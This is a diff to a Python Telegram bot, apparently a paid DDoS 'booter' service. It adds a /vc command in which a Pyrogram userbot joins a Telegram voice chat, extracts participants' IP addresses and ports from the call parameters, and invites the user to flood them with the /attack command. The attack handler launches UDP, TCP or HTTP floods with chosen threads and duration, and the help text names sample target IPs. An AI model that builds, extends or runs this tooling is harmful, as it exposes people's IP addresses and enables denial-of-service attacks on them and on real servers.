@@ -2,13 +2,102 @@
 import datetime
 import os
 import threading
+import asyncio
+import json
 import telebot
+from pyrogram import Client
+from pyrogram.raw import functions, types
 
 import config
 from king import attack, VECTORS
 
-# ── Mongo / Config / User / Logging Code (Same as before) ──────────────────
-# (Maine eh saara code same rakheya hai, sirf attack part change kitta hai)
+# ── Pyrogram Userbot Setup (VC IP Extractor) ──────────────────────────────
+pyro_loop = asyncio.new_event_loop()
+pyro_app = None
+PYROGRAM_ACTIVE = False
+
+if config.API_ID and config.API_HASH and config.SESSION_STRING:
+    try:
+        pyro_app = Client("userbot", api_id=config.API_ID, api_hash=config.API_HASH, session_string=config.SESSION_STRING, in_memory=True)
+        
+        def _run_pyro():
+            async def _start():
+                await pyro_app.start()
+                print("[pyrogram] Userbot connected. VC extraction ready.")
+                await asyncio.Event().wait()
+            pyro_loop.run_until_complete(_start())
+            
+        threading.Thread(target=_run_pyro, daemon=True).start()
+        PYROGRAM_ACTIVE = True
+    except Exception as e:
+        print(f"[pyrogram] Failed: {e}")
+
+async def _fetch_vc_ips(chat_identifier):
+    try:
+        if chat_identifier.startswith("-100") or chat_identifier.startswith("-"):
+            peer = await pyro_app.resolve_peer(int(chat_identifier))
+        else:
+            chat = await pyro_app.get_chat(chat_identifier)
+            peer = await pyro_app.resolve_peer(chat.id)
+
+        if isinstance(peer, types.InputPeerChannel):
+            full = await pyro_app.invoke(functions.channels.GetFullChannel(channel=peer))
+            call = full.full_chat.call
+        elif isinstance(peer, types.InputPeerChat):
+            full = await pyro_app.invoke(functions.messages.GetFullChat(chat_id=peer.chat_id))
+            call = full.full_chat.call
+        else:
+            return None, "Not a group/channel."
+
+        if not call:
+            return None, "No active voice chat found."
+
+        # Join to get params
+        try:
+            await pyro_app.invoke(
+                functions.phone.JoinGroupCall(
+                    call=types.InputGroupCall(id=call.id, access_hash=call.access_hash),
+                    join_as=peer,
+                    params=types.DataJSON(data=json.dumps({"ufrag": "x", "pwd": "x", "fingerprints": [], "ssrc": 1234})),
+                    muted=True, video_stopped=True,
+                )
+            )
+        except Exception:
+            pass
+
+        await asyncio.sleep(3)
+
+        group_call = await pyro_app.invoke(
+            functions.phone.GetGroupCall(
+                call=types.InputGroupCall(id=call.id, access_hash=call.access_hash), limit=1
+            )
+        )
+        
+        # Leave VC
+        try:
+            await pyro_app.invoke(functions.phone.LeaveGroupCall(call=types.InputGroupCall(id=call.id, access_hash=call.access_hash), source=0))
+        except: pass
+
+        params_data = group_call.call.params.data
+        data = json.loads(params_data)
+        
+        ips = []
+        for c in data.get("transport", {}).get("candidates", []):
+            if c.get("ip"): ips.append({"ip": c.get("ip"), "port": c.get("port", 0)})
+        for s in data.get("servers", []):
+            ip = s.get("ip") or s.get("host")
+            if ip: ips.append({"ip": ip, "port": s.get("port", 0)})
+                
+        return ips, None
+    except Exception as e:
+        return None, str(e)
+
+def fetch_vc_ips_sync(chat_identifier):
+    if not PYROGRAM_ACTIVE: return None, "Userbot not configured."
+    future = asyncio.run_coroutine_threadsafe(_fetch_vc_ips(chat_identifier), pyro_loop)
+    return future.result(timeout=15)
+
+# ── Mongo / Config / User / Logging Code ──────────────────────────────────
 _mongo_client, _mongo_db, _users_col, _logs_col = None, None, None, None
 if config.MONGO_URI:
     try:
@@ -59,8 +148,7 @@ def persist_add(user_id, expiry):
     else:
         uids = _file_read_users()
         if str(user_id) not in uids:
-            uids.append(str(user_id))
-            _file_write_users(uids)
+            uids.append(str(user_id)); _file_write_users(uids)
 
 def persist_remove(user_id):
     if _users_col is not None: _users_col.delete_one({"_id": str(user_id)})
@@ -109,7 +197,7 @@ def set_approval_expiry_date(user_id, duration, time_unit):
     persist_add(user_id, expiry)
     return expiry
 
-# (Add, Remove, Myinfo, Clearlogs, Clearusers, Allusers, Logs, Mylogs same as before)
+# ── Admin Commands ────────────────────────────────────────────────────────
 @bot.message_handler(commands=["add"])
 def add_user(message):
     user_id = str(message.chat.id)
@@ -156,38 +244,56 @@ def get_user_info(message):
     text = (f"👤 Your Info:\n\n🆔 User ID: <code>{user_id}</code>\n📝 Username: {username}\n🔖 Role: {role}\n📅 Approval Expiry: {expiry}\n⏳ Remaining: {remaining}")
     bot.reply_to(message, text, parse_mode="HTML")
 
-# ── ATTACK PARSER & HANDLER ───────────────────────────────────────────────
+# ── VC Extract Command ────────────────────────────────────────────────────
+@bot.message_handler(commands=["vc"])
+def handle_vc(message):
+    user_id = str(message.chat.id)
+    if user_id not in allowed_user_ids: return bot.reply_to(message, "Unauthorized.")
+    if not PYROGRAM_ACTIVE: return bot.reply_to(message, "String session not configured properly on server.")
+    
+    parts = message.text.split(maxsplit=1)
+    if len(parts) < 2: return bot.reply_to(message, "Usage: /vc <chat_id or username>")
+    
+    chat_id = parts[1].strip()
+    msg = bot.reply_to(message, "⏳ Joining VC & extracting IPs... (takes 5s)")
+    
+    def _task():
+        ips, err = fetch_vc_ips_sync(chat_id)
+        if err:
+            bot.edit_message_text(f"❌ Error: {err}", chat_id=message.chat.id, message_id=msg.message_id)
+            return
+        if not ips:
+            bot.edit_message_text("⚠️ No IPs found. (Call might be empty, relayed, or p2p failed).", chat_id=message.chat.id, message_id=msg.message_id)
+            return
+            
+        text = "🎯 <b>Extracted IPs:</b>\n\n"
+        for i in ips:
+            text += f"• <code>{i['ip']}:{i['port']}</code>\n"
+        text += "\nUse <code>/attack &lt;ip&gt; &lt;port&gt; 30 100 udp</code> to attack."
+        bot.edit_message_text(text, chat_id=message.chat.id, message_id=msg.message_id, parse_mode="HTML")
+        
+    threading.Thread(target=_task, daemon=True).start()
 
+# ── Attack Parser & Handler ───────────────────────────────────────────────
 def _parse_attack(text):
-    """
-    Accept:
-        /attack <host> <port> <time> [threads] [udp|tcp|http] [custom_host]
-        /attack <host>:<port> <time> [threads] [vector] [custom_host]
-    """
     parts = text.split()
     threads = config.DEFAULT_THREADS
-    vector = config.DEFAULT_VECTOR
+    vector = config.DEFAULT_VECTOR if hasattr(config, 'DEFAULT_VECTOR') else "udp"
     duration_default = config.DEFAULT_DURATION
     custom_host = None
 
-    # 1. Detect custom_host (if last arg is not a number and not a known vector, it's a host)
     if len(parts) >= 2 and not parts[-1].isdigit() and parts[-1].lower() not in VECTORS and ":" not in parts[-1] and "." in parts[-1]:
-        custom_host = parts[-1]
-        parts = parts[:-1]
+        custom_host = parts[-1]; parts = parts[:-1]
 
-    # 2. Detect trailing vector
     if len(parts) >= 2 and parts[-1].lower() in VECTORS:
-        vector = parts[-1].lower()
-        parts = parts[:-1]
+        vector = parts[-1].lower(); parts = parts[:-1]
 
-    # 3. Detect trailing threads
     if len(parts) >= 2 and parts[-1].isdigit() and len(parts) >= 4:
-        threads = int(parts[-1])
-        parts = parts[:-1]
+        threads = int(parts[-1]); parts = parts[:-1]
 
-    if len(parts) == 4: # cmd target port duration
+    if len(parts) == 4:
         target, port, duration = parts[1], int(parts[2]), int(parts[3])
-    elif len(parts) in (2, 3): # cmd host:port [duration]
+    elif len(parts) in (2, 3):
         head = parts[1]
         if ":" not in head: raise ValueError("missing port — use host:port")
         host, _, port_str = head.rpartition(":")
@@ -232,17 +338,10 @@ def handle_attack(message):
 
     def _run():
         t0 = datetime.datetime.now()
-        # HEROKU LOG PRINT
         print(f"[ATTACK] Firing {threads} threads at {target}:{port} via {vector.upper()} (Host: {custom_host or target})")
-        
         try:
-            r = attack(
-                target, port, duration, threads=threads,
-                payload_size=config.PAYLOAD_SIZE, vector=vector, custom_host=custom_host
-            )
+            r = attack(target, port, duration, threads=threads, payload_size=config.PAYLOAD_SIZE, vector=vector, custom_host=custom_host)
             elapsed = (datetime.datetime.now() - t0).total_seconds()
-
-            # HEROKU LOG PRINT
             print(f"[ATTACK DONE] Sent: {r['sent']}, Errors: {r['errors']}, ErrLast: {r.get('last_error')}")
 
             lines = [
@@ -256,7 +355,6 @@ def handle_attack(message):
             ]
             if r.get("last_error"): lines.append(f"Last err: {r['last_error']}")
             bot.send_message(message.chat.id, "\n".join(lines))
-
         except Exception as e:
             print(f"[ATTACK ERROR] {e}")
             try: bot.send_message(message.chat.id, f"❌ Attack error: {e}")
@@ -268,13 +366,14 @@ def handle_attack(message):
 def show_help(message):
     text = (
         "Available commands:\n"
-        "/attack    — /attack <host> <port> <time> [threads] [udp|tcp|http] [custom_host]\n"
-        "             Example: /attack 76.223.82.62 443 30 100 http dddostes-ed43fad90dc5.herokuapp.com\n"
+        "/vc <chat_id>   — Extract IPs from active Telegram VC\n"
+        "/attack <host> <port> <time> [threads] [vector] [host]\n"
+        "Example: /attack 104.199.204.225 9999 30 100 udp\n"
         "/rules, /mylogs, /plan, /myinfo, /admincmd"
     )
     bot.reply_to(message, text)
 
-# (Boot section)
+# ── Boot ──────────────────────────────────────────────────────────────────
 if __name__ == "__main__":
     storage = "mongo" if _users_col is not None else "files"
     print(f"[boot] storage={storage}  users={len(allowed_user_ids)}  vectors={VECTORS}")
